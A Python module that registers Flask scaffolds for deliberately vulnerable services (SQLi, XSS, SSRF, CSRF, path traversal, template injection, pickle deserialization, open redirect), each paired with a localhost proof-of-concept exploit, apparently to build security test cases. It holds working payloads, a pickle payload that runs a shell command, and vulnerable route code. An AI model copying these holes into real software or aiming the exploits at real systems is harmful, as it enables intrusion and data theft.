"""Registry of python/flask scaffold fragments for compiler-covered families."""
from __future__ import annotations

from dataclasses import dataclass
import re
from typing import Any, Callable, Dict, List, Optional, Tuple


@dataclass(frozen=True)
class FlaskFragmentSpec:
    strategy: str
    family: str
    fragment_id: str
    import_block: str
    route_block: str
    poc_builder: Callable[[int], Dict[str, str]]
    pattern_tags: Tuple[str, ...]
    notes: str
    service_description: str
    poc_description: str
    service_side_tokens: Tuple[str, ...]
    semantic_signature: Dict[str, Tuple[str, ...]]
    requirements_content: str = "Flask==3.0.0\nrequests==2.31.0\n"
    app_setup_block: str = ""
    startup_block: str = ""
    extra_files_builder: Optional[Callable[[int], List[Dict[str, Any]]]] = None


def _csrf_poc_content(port: int) -> Dict[str, str]:
    success_signature = "CSRF SUCCESS"
    flag_token = "FLAG-csrf-demo-token"
    poc_content = (
        "import argparse\n"
        "import requests\n"
        "import sys\n\n"
        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
        f"FLAG_TOKEN = {flag_token!r}\n\n"
        "def exploit(base_url: str) -> bool:\n"
        "    session = requests.Session()\n"
        "    base = base_url.rstrip('/')\n"
        "    try:\n"
        "        login_resp = session.get(base + '/login', params={'user': 'victim'}, timeout=5)\n"
        "        login_resp.raise_for_status()\n"
        "        resp = session.post(base + '/transfer', data={'recipient': 'attacker', 'amount': '250'}, timeout=5)\n"
        "        resp.raise_for_status()\n"
        "    except requests.RequestException as exc:\n"
        "        print(f'[csrf-compiler] request failed: {exc}', file=sys.stderr)\n"
        "        return False\n"
        "    try:\n"
        "        payload = resp.json()\n"
        "    except ValueError:\n"
        "        return False\n"
        "    return payload.get('ok') is True and str(payload.get('recipient')) == 'attacker' and str(payload.get('amount')) == '250' and str(payload.get('flag')) == FLAG_TOKEN\n\n"
        "def main() -> None:\n"
        "    parser = argparse.ArgumentParser(description='CSRF compiler PoC')\n"
        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
        "    args = parser.parse_args()\n"
        "    if exploit(args.base_url):\n"
        "        print(SUCCESS_SIGNATURE)\n"
        "        print(FLAG_TOKEN)\n"
        "        raise SystemExit(0)\n"
        "    print('[csrf-compiler] exploit did not succeed', file=sys.stderr)\n"
        "    raise SystemExit(1)\n\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )
    return {"success_signature": success_signature, "flag_token": flag_token, "poc_content": poc_content}


def _sqli_poc_content(port: int) -> Dict[str, str]:
    success_signature = "SQLi SUCCESS"
    flag_token = "FLAG-sqli-demo-token"
    poc_content = (
        "import argparse\n"
        "import requests\n"
        "import sys\n\n"
        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
        f"FLAG_TOKEN = {flag_token!r}\n"
        "DEFAULT_PARAMS = {'username': \"admin' OR '1'='1\", 'password': 'irrelevant'}\n\n"
        "def exploit(base_url: str) -> bool:\n"
        "    url = base_url.rstrip('/') + '/login'\n"
        "    try:\n"
        "        resp = requests.get(url, params=DEFAULT_PARAMS, timeout=5)\n"
        "        resp.raise_for_status()\n"
        "    except requests.RequestException as exc:\n"
        "        print(f'[sqli-compiler] request failed: {exc}', file=sys.stderr)\n"
        "        return False\n"
        "    try:\n"
        "        payload = resp.json()\n"
        "    except ValueError:\n"
        "        return False\n"
        "    rows = payload.get('rows') or []\n"
        "    return any(isinstance(row, dict) and row.get('username') == 'admin' for row in rows) and str(payload.get('flag')) == FLAG_TOKEN\n\n"
        "def main() -> None:\n"
        "    parser = argparse.ArgumentParser(description='SQLi compiler PoC')\n"
        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
        "    args = parser.parse_args()\n"
        "    if exploit(args.base_url):\n"
        "        print(SUCCESS_SIGNATURE)\n"
        "        print(FLAG_TOKEN)\n"
        "        raise SystemExit(0)\n"
        "    print('[sqli-compiler] exploit did not succeed', file=sys.stderr)\n"
        "    raise SystemExit(1)\n\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )
    return {"success_signature": success_signature, "flag_token": flag_token, "poc_content": poc_content}


def _path_traversal_poc_content(port: int) -> Dict[str, str]:
    success_signature = "Exploit SUCCESS"
    flag_token = "FLAG{PATH_TRAVERSAL_OK}"
    poc_content = (
        "import argparse\n"
        "import sys\n"
        "import requests\n\n"
        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
        f"FLAG_TOKEN = {flag_token!r}\n"
        "DEFAULT_PATH = '../secret.txt'\n\n"
        "def exploit(base_url: str, target_path: str) -> bool:\n"
        "    url = base_url.rstrip('/') + '/download'\n"
        "    try:\n"
        "        resp = requests.get(url, params={'path': target_path}, timeout=5)\n"
        "    except requests.RequestException as exc:\n"
        "        print(f'[path-traversal-compiler] request failed: {exc}', file=sys.stderr)\n"
        "        return False\n"
        "    return resp.status_code == 200 and FLAG_TOKEN in (resp.text or '')\n\n"
        "def main() -> None:\n"
        "    parser = argparse.ArgumentParser(description='Path Traversal compiler PoC')\n"
        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
        "    parser.add_argument('--payload', default=DEFAULT_PATH)\n"
        "    args = parser.parse_args()\n"
        "    if exploit(args.base_url, args.payload):\n"
        "        print(SUCCESS_SIGNATURE)\n"
        "        print(FLAG_TOKEN)\n"
        "        raise SystemExit(0)\n"
        "    print('[path-traversal-compiler] exploit did not succeed', file=sys.stderr)\n"
        "    raise SystemExit(1)\n\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )
    return {"success_signature": success_signature, "flag_token": flag_token, "poc_content": poc_content}


def _ssrf_poc_content(port: int) -> Dict[str, str]:
    success_signature = "FLAG{SSRF_OK}"
    flag_token = "FLAG{SSRF_OK}"
    default_target = f"http://127.0.0.1:{port}/metadata"
    poc_content = (
        "import argparse\n"
        "import json\n"
        "import sys\n"
        "from urllib.error import HTTPError, URLError\n"
        "from urllib.parse import quote\n"
        "from urllib.request import urlopen\n\n"
        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
        f"FLAG_TOKEN = {flag_token!r}\n"
        f"DEFAULT_TARGET = {default_target!r}\n\n"
        "def exploit(base_url: str, target: str) -> bool:\n"
        "    url = base_url.rstrip('/') + '/fetch?url=' + quote(target, safe=':/?=&')\n"
        "    try:\n"
        "        with urlopen(url, timeout=5) as resp:\n"
        "            body = resp.read().decode('utf-8', errors='ignore')\n"
        "    except (HTTPError, URLError) as exc:\n"
        "        print(f'[ssrf-compiler] request failed: {exc}', file=sys.stderr)\n"
        "        return False\n"
        "    try:\n"
        "        payload = json.loads(body)\n"
        "    except json.JSONDecodeError:\n"
        "        return False\n"
        "    return str(payload.get('flag')) == FLAG_TOKEN\n\n"
        "def main() -> None:\n"
        "    parser = argparse.ArgumentParser(description='SSRF compiler PoC')\n"
        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
        "    parser.add_argument('--payload', default=DEFAULT_TARGET)\n"
        "    args = parser.parse_args()\n"
        "    if exploit(args.base_url, args.payload):\n"
        "        print(SUCCESS_SIGNATURE)\n"
        "        print(FLAG_TOKEN)\n"
        "        raise SystemExit(0)\n"
        "    print('[ssrf-compiler] exploit did not succeed', file=sys.stderr)\n"
        "    raise SystemExit(1)\n\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )
    return {"success_signature": success_signature, "flag_token": flag_token, "poc_content": poc_content}


def _deserialization_poc_content(port: int) -> Dict[str, str]:
    success_signature = "Exploit SUCCESS"
    flag_token = "FLAG{DESER_OK}"
    poc_content = (
        "import argparse\n"
        "import json\n"
        "import pickle\n"
        "import sys\n"
        "from urllib.error import HTTPError, URLError\n"
        "from urllib.request import Request, urlopen\n\n"
        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
        f"FLAG_TOKEN = {flag_token!r}\n\n"
        "class Exploit:\n"
        "    def __reduce__(self):\n"
        "        import subprocess\n"
        "        return (subprocess.getoutput, ('cat /tmp/deser-flag.txt',))\n\n"
        "def exploit(base_url: str) -> bool:\n"
        "    target = base_url.rstrip('/') + '/deserialize'\n"
        "    payload = pickle.dumps(Exploit(), protocol=pickle.HIGHEST_PROTOCOL)\n"
        "    request_obj = Request(target, data=payload, method='POST')\n"
        "    request_obj.add_header('Content-Type', 'application/octet-stream')\n"
        "    try:\n"
        "        with urlopen(request_obj, timeout=5) as resp:\n"
        "            body = resp.read().decode('utf-8', errors='ignore')\n"
        "    except (HTTPError, URLError) as exc:\n"
        "        print(f'[deser-compiler] request failed: {exc}', file=sys.stderr)\n"
        "        return False\n"
        "    try:\n"
        "        payload = json.loads(body)\n"
        "    except json.JSONDecodeError:\n"
        "        return False\n"
        "    return str(payload.get('result')) == FLAG_TOKEN\n\n"
        "def main() -> None:\n"
        "    parser = argparse.ArgumentParser(description='Deserialization compiler PoC')\n"
        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
        "    args = parser.parse_args()\n"
        "    if exploit(args.base_url):\n"
        "        print(SUCCESS_SIGNATURE)\n"
        "        print(FLAG_TOKEN)\n"
        "        raise SystemExit(0)\n"
        "    print('[deser-compiler] exploit did not succeed', file=sys.stderr)\n"
        "    raise SystemExit(1)\n\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )
    return {"success_signature": success_signature, "flag_token": flag_token, "poc_content": poc_content}


def _open_redirect_poc_content(port: int) -> Dict[str, str]:
    success_signature = "Exploit SUCCESS"
    flag_token = "FLAG{OPEN_REDIRECT_OK}"
    poc_content = (
        "import argparse\n"
        "import sys\n"
        "import requests\n\n"
        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
        f"FLAG_TOKEN = {flag_token!r}\n"
        "DEFAULT_TARGET = 'https://evil.example/landing'\n\n"
        "def exploit(base_url: str, target: str) -> bool:\n"
        "    url = base_url.rstrip('/') + '/go'\n"
        "    try:\n"
        "        resp = requests.get(url, params={'next': target}, timeout=5, allow_redirects=False)\n"
        "    except requests.RequestException as exc:\n"
        "        print(f'[open-redirect-compiler] request failed: {exc}', file=sys.stderr)\n"
        "        return False\n"
        "    location = resp.headers.get('Location', '')\n"
        "    return resp.status_code in {301, 302, 303, 307, 308} and location == target\n\n"
        "def main() -> None:\n"
        "    parser = argparse.ArgumentParser(description='Open Redirect compiler PoC')\n"
        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
        "    parser.add_argument('--payload', default=DEFAULT_TARGET)\n"
        "    args = parser.parse_args()\n"
        "    if exploit(args.base_url, args.payload):\n"
        "        print(SUCCESS_SIGNATURE)\n"
        "        print(FLAG_TOKEN)\n"
        "        raise SystemExit(0)\n"
        "    print('[open-redirect-compiler] exploit did not succeed', file=sys.stderr)\n"
        "    raise SystemExit(1)\n\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )
    return {"success_signature": success_signature, "flag_token": flag_token, "poc_content": poc_content}


def _template_injection_poc_content(port: int) -> Dict[str, str]:
    success_signature = "Exploit SUCCESS"
    flag_token = "FLAG{SSTI_OK}"
    poc_content = (
        "import argparse\n"
        "import sys\n"
        "import requests\n\n"
        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
        f"FLAG_TOKEN = {flag_token!r}\n"
        "DEFAULT_PAYLOAD = 'SSTI_OK {{7*7}}'\n\n"
        "def exploit(base_url: str, payload: str) -> bool:\n"
        "    url = base_url.rstrip('/') + '/greet'\n"
        "    try:\n"
        "        resp = requests.get(url, params={'name': payload}, timeout=5)\n"
        "    except requests.RequestException as exc:\n"
        "        print(f'[template-injection-compiler] request failed: {exc}', file=sys.stderr)\n"
        "        return False\n"
        "    body = resp.text or ''\n"
        "    return resp.status_code == 200 and '49' in body and 'SSTI_OK' in body\n\n"
        "def main() -> None:\n"
        "    parser = argparse.ArgumentParser(description='Template Injection compiler PoC')\n"
        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
        "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)\n"
        "    args = parser.parse_args()\n"
        "    if exploit(args.base_url, args.payload):\n"
        "        print(SUCCESS_SIGNATURE)\n"
        "        print(FLAG_TOKEN)\n"
        "        raise SystemExit(0)\n"
        "    print('[template-injection-compiler] exploit did not succeed', file=sys.stderr)\n"
        "    raise SystemExit(1)\n\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )
    return {"success_signature": success_signature, "flag_token": flag_token, "poc_content": poc_content}


def _xss_poc_content(port: int) -> Dict[str, str]:
    success_signature = "Exploit SUCCESS"
    flag_token = "FLAG{XSS_OK}"
    poc_content = (
        "import argparse\n"
        "import sys\n"
        "import requests\n\n"
        f"SUCCESS_SIGNATURE = {success_signature!r}\n"
        f"FLAG_TOKEN = {flag_token!r}\n"
        "DEFAULT_PAYLOAD = '<script>alert(1)</script>'\n\n"
        "def exploit(base_url: str, payload: str) -> bool:\n"
        "    url = base_url.rstrip('/') + '/search'\n"
        "    try:\n"
        "        resp = requests.get(url, params={'name': payload}, timeout=5)\n"
        "    except requests.RequestException as exc:\n"
        "        print(f'[xss-compiler] request failed: {exc}', file=sys.stderr)\n"
        "        return False\n"
        "    return resp.status_code == 200 and payload in (resp.text or '')\n\n"
        "def main() -> None:\n"
        "    parser = argparse.ArgumentParser(description='Reflected XSS compiler PoC')\n"
        f"    parser.add_argument('--base-url', default='http://127.0.0.1:{port}')\n"
        "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)\n"
        "    args = parser.parse_args()\n"
        "    if exploit(args.base_url, args.payload):\n"
        "        print(SUCCESS_SIGNATURE)\n"
        "        print(FLAG_TOKEN)\n"
        "        raise SystemExit(0)\n"
        "    print('[xss-compiler] exploit did not succeed', file=sys.stderr)\n"
        "    raise SystemExit(1)\n\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )
    return {"success_signature": success_signature, "flag_token": flag_token, "poc_content": poc_content}


def _path_traversal_extra_files(_: int) -> List[Dict[str, Any]]:
    return [
        {
            "path": "secret.txt",
            "role": "helper",
            "description": "Traversal target file containing the exfiltration marker.",
            "content": "FLAG{PATH_TRAVERSAL_OK}\n",
        },
        {
            "path": "files/note.txt",
            "role": "helper",
            "description": "Safe in-root file used by the vulnerable route.",
            "content": "safe-note\n",
        },
    ]


FLASK_FRAGMENT_REGISTRY: Dict[str, FlaskFragmentSpec] = {
    "csrf_missing_token": FlaskFragmentSpec(
        strategy="csrf_missing_token",
        family="csrf",
        fragment_id="csrf_state_change_route",
        import_block="from flask import Flask, jsonify, request, session",
        route_block=(
            "@app.get('/login')\n"
            "def login():\n"
            "    user = request.args.get('user', 'victim')\n"
            "    session['user'] = user\n"
            "    BALANCES.setdefault(user, 1000)\n"
            "    return jsonify({'logged_in_as': user})\n\n"
            "@app.post('/transfer')\n"
            "def transfer():\n"
            "    # Registry-backed compiler fragment: state-changing endpoint accepts cookie-authenticated POST with no CSRF token.\n"
            "    user = session.get('user', 'victim')\n"
            "    recipient = request.form.get('recipient', 'attacker')\n"
            "    amount = int(request.form.get('amount', '250'))\n"
            "    BALANCES[recipient] = BALANCES.get(recipient, 0) + amount\n"
            "    BALANCES[user] = BALANCES.get(user, 1000) - amount\n"
            "    return jsonify({'ok': True, 'by': user, 'recipient': recipient, 'amount': amount, 'recipient_balance': BALANCES[recipient], 'flag': 'FLAG-csrf-demo-token'})\n"
        ),
        poc_builder=_csrf_poc_content,
        pattern_tags=("compiler_generated", "csrf"),
        notes="Registry-backed compiler scaffold/fragment bundle for CSRF.",
        service_description="python/flask registry-backed CSRF service.",
        poc_description="Registry-backed CSRF PoC.",
        service_side_tokens=("request.form", "@app.post('/transfer')"),
        semantic_signature={
            "input_vector": ("cross-site request", "cookie-authenticated session"),
            "sink": ("state-changing endpoint (POST/PUT/DELETE/PATCH)",),
            "exploit_precondition": ("missing CSRF token validation",),
        },
        app_setup_block="app.secret_key = 'csrf-compiler-secret'\nBALANCES = {'victim': 1000, 'attacker': 0}",
    ),
    "open_redirect_reflect": FlaskFragmentSpec(
        strategy="open_redirect_reflect",
        family="open_redirect",
        fragment_id="redirect_next_route",
        import_block="from flask import Flask, redirect, request",
        route_block=(
            "@app.get('/go')\n"
            "def go():\n"
            "    # Registry-backed compiler fragment: unvalidated user-controlled next parameter reaches redirect().\n"
            "    next_url = request.args.get('next', 'https://example.com')\n"
            "    return redirect(next_url, code=302)\n"
        ),
        poc_builder=_open_redirect_poc_content,
        pattern_tags=("compiler_generated", "open_redirect"),
        notes="Registry-backed compiler scaffold/fragment bundle for open redirect.",
        service_description="python/flask registry-backed open redirect service.",
        poc_description="Registry-backed open redirect PoC.",
        service_side_tokens=("redirect(", "request.args.get('next'"),
        semantic_signature={
            "input_vector": ("request.args", "next parameter", "redirect target", "url parameter"),
            "sink": ("redirect(", "location header", "http redirect sink"),
            "exploit_precondition": ("open redirect", "unvalidated redirect target", "external redirect"),
        },
    ),
    "template_injection_render": FlaskFragmentSpec(
        strategy="template_injection_render",
        family="template_injection",
        fragment_id="render_template_string_concat",
        import_block="from flask import Flask, render_template_string, request",
        route_block=(
            "@app.get('/greet')\n"
            "def greet():\n"
            "    # Registry-backed compiler fragment: user input is concatenated into template source.\n"
            "    name = request.args.get('name', 'Guest')\n"
            "    template = '<h1>Hello ' + name + '</h1>'\n"
            "    return render_template_string(template)\n"
        ),
        poc_builder=_template_injection_poc_content,
        pattern_tags=("compiler_generated", "template_injection"),
        notes="Registry-backed compiler scaffold/fragment bundle for template injection.",
        service_description="python/flask registry-backed template injection service.",
        poc_description="Registry-backed template injection PoC.",
        service_side_tokens=("render_template_string", "template = '<h1>Hello ' + name"),
        semantic_signature={
            "input_vector": ("request.args", "request.form", "query parameter", "user-controlled request parameter"),
            "sink": ("render_template_string", "jinja2 template rendering", "template source construction"),
            "exploit_precondition": ("template injection", "server-side template injection", "user-controlled template source"),
        },
    ),
    "xss_reflected": FlaskFragmentSpec(
        strategy="xss_reflected",
        family="xss",
        fragment_id="render_reflect_route",
        import_block="from flask import Flask, render_template_string, request",
        route_block=(
            "@app.get('/search')\n"
            "def search():\n"
            "    # Registry-backed compiler fragment: unescaped user input is reflected into template output.\n"
            "    name = request.args.get('name', 'Guest')\n"
            "    template = \"<div class='result'>\" + name + \"</div>\"\n"
            "    return render_template_string(template)\n"
        ),
        poc_builder=_xss_poc_content,
        pattern_tags=("compiler_generated", "xss"),
        notes="Registry-backed compiler scaffold/fragment bundle for reflected XSS.",
        service_description="python/flask registry-backed reflected XSS service.",
        poc_description="Registry-backed reflected XSS PoC.",
        service_side_tokens=("render_template_string", "request.args"),
        semantic_signature={
            "input_vector": ("request.args", "query parameter", "user input"),
            "sink": ("render_template_string", "template response"),
            "exploit_precondition": ("<script>", "unescaped reflection", "cross-site scripting"),
        },
    ),
    "path_traversal_file_read": FlaskFragmentSpec(
        strategy="path_traversal_file_read",
        family="path_traversal",
        fragment_id="file_read_download_route",
        import_block="from pathlib import Path\nfrom flask import Flask, Response, request",
        route_block=(
            "@app.get('/download')\n"
            "def download():\n"
            "    path = request.args.get('path', 'note.txt')\n"
            "    # Registry-backed compiler fragment: attacker can request ../secret.txt to escape BASE_DIR.\n"
            "    target = BASE_DIR / path\n"
            "    try:\n"
            "        body = target.read_text(encoding='utf-8', errors='ignore')\n"
            "    except OSError as exc:\n"
            "        return Response(f'error: {exc}', status=404, mimetype='text/plain')\n"
            "    return Response(body, mimetype='text/plain')\n"
        ),
        poc_builder=_path_traversal_poc_content,
        pattern_tags=("compiler_generated", "path_traversal"),
        notes="Registry-backed compiler scaffold/fragment bundle for path traversal.",
        service_description="python/flask registry-backed path traversal service.",
        poc_description="Registry-backed path traversal PoC.",
        service_side_tokens=("request.args", "target = BASE_DIR / path"),
        semantic_signature={
            "input_vector": ("request.args", "path parameter"),
            "sink": ("open(", "send_file", "send_from_directory"),
            "exploit_precondition": ("../", "os.path.join", "path traversal"),
        },
        app_setup_block="BASE_DIR = Path('/app/files')\nSECRET_PATH = Path('/app/secret.txt')",
        extra_files_builder=_path_traversal_extra_files,
    ),
    "sqli_string_concat": FlaskFragmentSpec(
        strategy="sqli_string_concat",
        family="sql_injection",
        fragment_id="login_query_concat_route",
        import_block="from pathlib import Path\nimport sqlite3\nfrom flask import Flask, jsonify, request",
        route_block=(
            "@app.get('/login')\n"
            "def login():\n"
            "    # Registry-backed compiler fragment: request input is concatenated into a SQL query string.\n"
            "    query = (\n"
            "        \"SELECT id, username FROM users \"\n"
            "        \"WHERE username = '\" + request.args.get('username', '') + \"' \"\n"
            "        \"AND password = '\" + request.args.get('password', '') + \"'\"\n"
            "    )\n"
            "    conn = sqlite3.connect(DB_PATH)\n"
            "    conn.row_factory = sqlite3.Row\n"
            "    cur = conn.cursor()\n"
            "    rows = cur.execute(query).fetchall()\n"
            "    conn.close()\n"
            "    return jsonify({'match': bool(rows), 'rows': [dict(row) for row in rows], 'query': query, 'flag': 'FLAG-sqli-demo-token'})\n"
        ),
        poc_builder=_sqli_poc_content,
        pattern_tags=("compiler_generated", "sql_injection"),
        notes="Registry-backed compiler scaffold/fragment bundle for SQL injection.",
        service_description="python/flask registry-backed SQL injection service.",
        poc_description="Registry-backed SQL injection PoC.",
        service_side_tokens=("request.args", "cur.execute"),
        semantic_signature={
            "input_vector": ("user-controlled request parameter", "request.args"),
            "sink": ("SQL query execution", "sqlite3.execute", "cur.execute"),
            "exploit_precondition": ("input concatenated/interpolated into SQL sink", "sql injection"),
        },
        app_setup_block=(
            "DB_PATH = Path('/tmp/sqli-demo.db')\n"
            "SCHEMA_SQL = '''\n"
            "CREATE TABLE IF NOT EXISTS users (\n"
            "    id INTEGER PRIMARY KEY AUTOINCREMENT,\n"
            "    username TEXT,\n"
            "    password TEXT\n"
            ");\n"
            "DELETE FROM users;\n"
            "INSERT INTO users (username, password) VALUES ('admin', 'secret');\n"
            "INSERT INTO users (username, password) VALUES ('guest', 'guest');\n"
            "'''\n\n"
            "def init_db() -> None:\n"
            "    conn = sqlite3.connect(DB_PATH)\n"
            "    conn.executescript(SCHEMA_SQL)\n"
            "    conn.commit()\n"
            "    conn.close()"
        ),
        startup_block="    init_db()\n",
    ),
    "ssrf_loopback_fetch": FlaskFragmentSpec(
        strategy="ssrf_loopback_fetch",
        family="ssrf",
        fragment_id="loopback_fetch_route",
        import_block="import requests\nfrom flask import Flask, jsonify, request",
        route_block=(
            "@app.get('/metadata')\n"
            "def metadata():\n"
            "    return jsonify({'flag': 'FLAG{SSRF_OK}', 'service': 'metadata'})\n\n"
            "@app.get('/fetch')\n"
            "def fetch():\n"
            "    # Registry-backed compiler fragment: user-controlled url reaches requests.get.\n"
            "    target_url = request.args.get('url', 'http://127.0.0.1:{{port}}/metadata')\n"
            "    resp = requests.get(target_url, timeout=2)\n"
            "    return resp.text, resp.status_code, {'Content-Type': resp.headers.get('Content-Type', 'text/plain')}\n"
        ),
        poc_builder=_ssrf_poc_content,
        pattern_tags=("compiler_generated", "ssrf"),
        notes="Registry-backed compiler scaffold/fragment bundle for SSRF.",
        service_description="python/flask registry-backed SSRF service.",
        poc_description="Registry-backed SSRF PoC.",
        service_side_tokens=("requests.get", "/metadata"),
        semantic_signature={
            "input_vector": ("request.args", "url parameter", "user-controlled url"),
            "sink": ("requests.get", "urllib.request", "http client request"),
            "exploit_precondition": ("server-side request forgery", "169.254.169.254"),
        },
    ),
    "deserialization_pickle_body": FlaskFragmentSpec(
        strategy="deserialization_pickle_body",
        family="deserialization",
        fragment_id="unsafe_pickle_body_route",
        import_block="from pathlib import Path\nimport pickle\nfrom flask import Flask, jsonify, request",
        route_block=(
            "@app.post('/deserialize')\n"
            "def deserialize_payload():\n"
            "    # Registry-backed compiler fragment: insecure deserialization of attacker-controlled serialized payload.\n"
            "    payload = request.get_data()\n"
            "    result = pickle.loads(payload)\n"
            "    return jsonify({'result': str(result)})\n"
        ),
        poc_builder=_deserialization_poc_content,
        pattern_tags=("compiler_generated", "deserialization"),
        notes="Registry-backed compiler scaffold/fragment bundle for insecure deserialization.",
        service_description="python/flask registry-backed insecure deserialization service.",
        poc_description="Registry-backed insecure deserialization PoC.",
        service_side_tokens=("pickle.loads", "request.get_data"),
        semantic_signature={
            "input_vector": ("request.data", "serialized payload"),
            "sink": ("pickle.loads", "yaml.load", "jsonpickle.decode"),
            "exploit_precondition": ("untrusted deserialization", "attacker-controlled serialized input"),
        },
        requirements_content="Flask==3.0.0\n",
        app_setup_block=(
            "FLAG_PATH = Path('/tmp/deser-flag.txt')\n"
            "FLAG_VALUE = 'FLAG{DESER_OK}'\n\n"
            "def init_runtime_state() -> None:\n"
            "    FLAG_PATH.write_text(FLAG_VALUE, encoding='utf-8')"
        ),
        startup_block="    init_runtime_state()\n",
    ),
}


_EXACT_VULN_STRATEGIES = {
    "CWE-89": "sqli_string_concat",
    "CWE_89": "sqli_string_concat",
    "CWE-352": "csrf_missing_token",
    "CWE_352": "csrf_missing_token",
    "CWE-22": "path_traversal_file_read",
    "CWE_22": "path_traversal_file_read",
    "CWE-79": "xss_reflected",
    "CWE_79": "xss_reflected",
    "CWE-918": "ssrf_loopback_fetch",
    "CWE_918": "ssrf_loopback_fetch",
    "CWE-502": "deserialization_pickle_body",
    "CWE_502": "deserialization_pickle_body",
    "NAME-OPEN-REDIRECT": "open_redirect_reflect",
    "NAME-TEMPLATE-INJECTION": "template_injection_render",
}


def _resolve_exact_fragment_strategy(vuln_id: str) -> str | None:
    token = str(vuln_id or "").strip().upper()
    return _EXACT_VULN_STRATEGIES.get(token)


def resolve_fragment_strategy(vuln_id: str, pattern_id: str = "", raw_label: str = "") -> str | None:
    exact = _resolve_exact_fragment_strategy(vuln_id)
    if exact:
        return exact
    normalized_pattern = str(pattern_id or "").strip().lower()
    normalized_label = str(raw_label or "").strip().lower()
    if (
        "open-redirect" in normalized_pattern
        or "open redirect" in normalized_label
        or "unvalidated redirect" in normalized_label
        or "unvalidated redirection" in normalized_label
    ):
        return "open_redirect_reflect"
    if "template-injection" in normalized_pattern or "ssti" in normalized_pattern or "template injection" in normalized_label:
        return "template_injection_render"
    if "path-traversal" in normalized_pattern or "path traversal" in normalized_label:
        return "path_traversal_file_read"
    if "xss" in normalized_pattern or "cross-site scripting" in normalized_label:
        return "xss_reflected"
    if "ssrf" in normalized_pattern or "server-side request forgery" in normalized_label:
        return "ssrf_loopback_fetch"
    if "deserialization" in normalized_pattern or "insecure deserialization" in normalized_label:
        return "deserialization_pickle_body"
    if "sqli" in normalized_pattern or "sql injection" in normalized_label:
        return "sqli_string_concat"
    if "csrf" in normalized_pattern or "cross site request forgery" in normalized_label:
        return "csrf_missing_token"
    return None


def resolve_fragment_spec(vuln_id: str, pattern_id: str = "", raw_label: str = "") -> FlaskFragmentSpec | None:
    strategy = resolve_fragment_strategy(vuln_id, pattern_id=pattern_id, raw_label=raw_label)
    if not strategy:
        return None
    return FLASK_FRAGMENT_REGISTRY.get(strategy)


def fragment_semantic_signature(vuln_id: str, pattern_id: str = "", raw_label: str = "") -> Dict[str, List[str]]:
    exact = _resolve_exact_fragment_strategy(vuln_id)
    spec = FLASK_FRAGMENT_REGISTRY.get(exact) if exact else None
    if spec is None:
        return {
            "input_vector": [],
            "sink": [],
            "exploit_precondition": [],
        }
    return {
        bucket: [str(item) for item in (spec.semantic_signature.get(bucket) or ()) if str(item).strip()]
        for bucket in ("input_vector", "sink", "exploit_precondition")
    }


def fragment_guard_generator_assertions(vuln_id: str, pattern_id: str = "", raw_label: str = "") -> List[Dict[str, Any]]:
    exact = _resolve_exact_fragment_strategy(vuln_id)
    spec = FLASK_FRAGMENT_REGISTRY.get(exact) if exact else None
    if spec is None:
        return []
    assertions: List[Dict[str, Any]] = [
        {"op": "role_exists", "role": "service_main"},
        {"op": "role_exists", "role": "poc_entry"},
        {"op": "manifest_field_contains", "field": "metadata.stack_scaffold_id", "string": "python/flask"},
        {"op": "manifest_field_contains", "field": "metadata.fragment_id", "string": spec.fragment_id},
        {"op": "manifest_field_contains", "field": "metadata.compose_mode", "string": "registry"},
        {"op": "manifest_field_contains", "field": "metadata.compiler_strategy", "string": spec.strategy},
    ]
    deps = _requirements_dep_candidates(spec.requirements_content)
    if deps:
        assertions.append(
            {
                "op": "any_dep_declared",
                "deps": deps,
                "intent": "dependency",
                "stability": "high",
            }
        )
    for token in spec.service_side_tokens:
        if not token:
            continue
        assertions.append(
            {
                "op": "file_contains",
                "path": "app.py",
                "string": token,
                "severity": "warn",
                "intent": "syntax_hint",
                "stability": "high",
            }
        )
    return assertions


def service_side_file_contains_tokens(vuln_id: str, pattern_id: str = "", raw_label: str = "") -> List[str]:
    spec = resolve_fragment_spec(vuln_id, pattern_id=pattern_id, raw_label=raw_label)
    if spec is None:
        return []
    return [token for token in spec.service_side_tokens if token]


def _requirements_dep_candidates(requirements_content: str) -> List[str]:
    deps: List[str] = []
    seen: set[str] = set()
    for line in str(requirements_content or "").splitlines():
        token = line.split("#", 1)[0].strip().lower()
        if not token:
            continue
        normalized = re.split(r"[<>=!~\[\]\s]+", token, maxsplit=1)[0]
        if not normalized or normalized in seen:
            continue
        seen.add(normalized)
        deps.append(normalized)
    return deps


__all__ = [
    "FLASK_FRAGMENT_REGISTRY",
    "FlaskFragmentSpec",
    "fragment_guard_generator_assertions",
    "fragment_semantic_signature",
    "resolve_fragment_strategy",
    "resolve_fragment_spec",
    "service_side_file_contains_tokens",
]
